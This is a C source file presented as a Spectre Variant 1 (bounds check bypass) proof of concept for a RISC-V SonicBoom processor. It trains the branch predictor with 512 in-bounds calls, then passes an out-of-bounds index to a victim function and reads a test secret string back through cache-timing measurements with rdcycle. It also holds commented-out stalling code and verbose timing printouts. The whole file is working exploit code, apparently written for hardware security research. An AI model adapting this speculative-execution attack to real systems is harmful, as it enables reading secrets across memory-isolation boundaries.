#include <stdio.h>
#include <stdint.h> 
#include "encoding.h"
#include "flushCache.h"

//#define TRAIN_TIMES 6 // assumption is that you have a 2 bit counter in the predictor
#define TRAIN_TIMES 512  // the predictor in SonicBoom is much more sophisticated, need more trainning
#define ROUNDS 1 // run the train + attack sequence X amount of times (for redundancy)
#define ATTACK_SAME_ROUNDS 25 // amount of times to attack the same index
//#define SECRET_SZ 26
#define SECRET_SZ 26
#define CACHE_HIT_THRESHOLD 90

uint64_t array1_sz = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256 * L1_BLOCK_SZ_BYTES];
//char* secretString = "!\"#ThisIsTheBabyBoomerTest";
char* secretString = "!\"#ThisIsTheSpectreV1Poc!!";

void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, uint64_t* outValArray){
    outValArray[0] = 0;
    outValArray[1] = 0;

    for (uint64_t i = 0; i < inArraySize; ++i){
        if (inArray[i] > outValArray[0]){
            outValArray[1] = outValArray[0];
            outValArray[0] = inArray[i];
            outIdxArray[1] = outIdxArray[0];
            outIdxArray[0] = i;
        }
        else if (inArray[i] > outValArray[1]){
            outValArray[1] = inArray[i];
            outIdxArray[1] = i;
        }
    }
}

/**
 * takes in an idx to use to access a secret array. this idx is used to read any mem addr outside
 * the bounds of the array through the Spectre Variant 1 attack.
 *
 * @input idx input to be used to idx the array
 */
void victimFunc(uint64_t idx){
     uint8_t dummy = 2;
uint64_t   start=0, diff=0;
 uint8_t    dummy1 = 0;
        // start = rdcycle();
        // dummy1= array1_sz;
        // diff = (rdcycle() - start);
        // printf("test:read from ram, cycles = %lu\n", diff); 
    //stall array1_sz by doing div operations (operation is (array1_sz << 4) / (2*4))
    //array1_sz =  array1_sz << 4;
  
    // for(int i=0;i<10;i++){
    // asm("fcvt.s.lu	fa4, %[in]\n"
    //     "fcvt.s.lu	fa5, %[inout]\n"
    //     "fdiv.s	fa5, fa5, fa4\n"
    //     "fdiv.s	fa5, fa5, fa4\n"
    //     "fdiv.s	fa5, fa5, fa4\n"
    //     "fdiv.s	fa5, fa5, fa4\n"
    //     "fcvt.lu.s	%[out], fa5, rtz\n"
    //     : [out] "=r" (array1_sz)
    //     : [inout] "r" (array1_sz), [in] "r" (dummy)
    //     : "fa4", "fa5");
    // }

// flushCache(); 

        
    //     start = rdcycle();
    //     dummy1= array1_sz;
    //     diff = (rdcycle() - start);
    //     printf("test:read from ram, cycles = %lu\n", diff); 
     
    //     start = rdcycle();
    //     dummy1= array1_sz;
    //     diff = (rdcycle() - start);
    //     printf("test:read from cache, cycles = %lu\n", diff); 
    // flushCache(); 
    // for(int i=0;i<10;i++){
    // asm("fcvt.s.lu	fa4, %[in]\n"
    //     "fcvt.s.lu	fa5, %[inout]\n"
    //     "fdiv.s	fa5, fa5, fa4\n"
    //     "fdiv.s	fa5, fa5, fa4\n"
    //     "fdiv.s	fa5, fa5, fa4\n"
    //     "fdiv.s	fa5, fa5, fa4\n"
    //     "fcvt.lu.s	%[out], fa5, rtz\n"
    //     : [out] "=r" (array1_sz)
    //     : [inout] "r" (array1_sz), [in] "r" (dummy)
    //     : "fa4", "fa5");
    // }
    flushCache();
    start = rdcycle();
    dummy1= array2[array1[idx] * L1_BLOCK_SZ_BYTES];
    diff = (rdcycle() - start);
     printf("test:read from ram, cycles = %lu\n", diff); 
       start = rdcycle();
    dummy1= array2[array1[idx] * L1_BLOCK_SZ_BYTES];
    diff = (rdcycle() - start);
     printf("test:read from cache, cycles = %lu\n", diff); 
     flushCache(); 

    if (idx < array1_sz){
        dummy = array2[array1[idx] * L1_BLOCK_SZ_BYTES];
    }
        start = rdcycle();
        dummy1=  array2[array1[idx] * L1_BLOCK_SZ_BYTES];
        diff = (rdcycle() - start);
     printf("test:read from cache, cycles = %lu\n", diff);  

    // bound speculation here just in case it goes over
    dummy = rdcycle();
}

int main(void){
    uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
    uint64_t start, diff, passInIdx, randIdx;
    uint8_t dummy = 0;
    static uint64_t results[256];

    printf("================= This is a POC of spectre_v1 (Branch Condition Check Bypass) ========================= \n");
    printf("the secret key is:%s \n", secretString);

    // try to read out the secret
    for(uint64_t len = 0; len < SECRET_SZ; ++len){

        // clear results every round
        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx){
            results[cIdx] = 0;
        }

        // run the attack on the same idx ATTACK_SAME_ROUNDS times
        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){

            // make sure array you read from is not in the cache
            //flushCache((uint64_t)arrayF2, sizeof(array2));
            flushCache();
            //asm("dcache.iall");
            for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j){
                // bit twiddling to set passInIdx=randIdx or to attackIdx after TRAIN_TIMES iterations
                // avoid jumps in case those tip off the branch predictor
                // note: randIdx changes everytime the atkRound changes so that the tally does not get affected
                //       training creates a false hit in array2 for that array1 value (you want this to be ignored by having it changed)
                randIdx = atkRound % array1_sz;
                passInIdx = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInIdx=...FFFF0000 else 0
                passInIdx = (passInIdx | (passInIdx >> 16)); // set the passInIdx=-1 or 0
                passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx 

                // set of constant takens to make the BHR be in a all taken state
                for(uint64_t k = 0; k < 100; ++k){
                    asm("");
                }
                printf("len = [%lu],atkRound=[%lu],j=[%lu],passIndex=[%lu]\n",len,atkRound,j,passInIdx);
                //printf("passIndex=[%lu]\n",passInIdx);
                // call function to train or attack
                victimFunc(passInIdx);
            }
            
            // read out array 2 and see the hit secret value
            // this is also assuming there is no prefetching
            for (uint64_t i = 0; i < 256; ++i){
                uint64_t  uiTemp = 0;  //introduced a dummy variable to prevent compiler optimizations
                start = rdcycle();
                dummy &= array2[i * L1_BLOCK_SZ_BYTES];
                diff = (rdcycle() - start);
               printf("%c,i = %lu\t",i,diff);
                if ( diff < CACHE_HIT_THRESHOLD ){
                    results[i] += 1;
                }
            }
            //printf("\n");
            
        }


        // get highest and second highest result hit values
        uint8_t output[2];
        uint64_t hitArray[2];
        topTwoIdx(results, 256, output, hitArray);

        printf("m[0x%p] = want(%c) =?= guess(hits,dec,char) 1.(%lu, %d, %c) 2.(%lu, %d, %c)\n", (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], hitArray[1], output[1], output[1]); 

        // read in the next secret 
        ++attackIdx;
    }

    return 0;
}
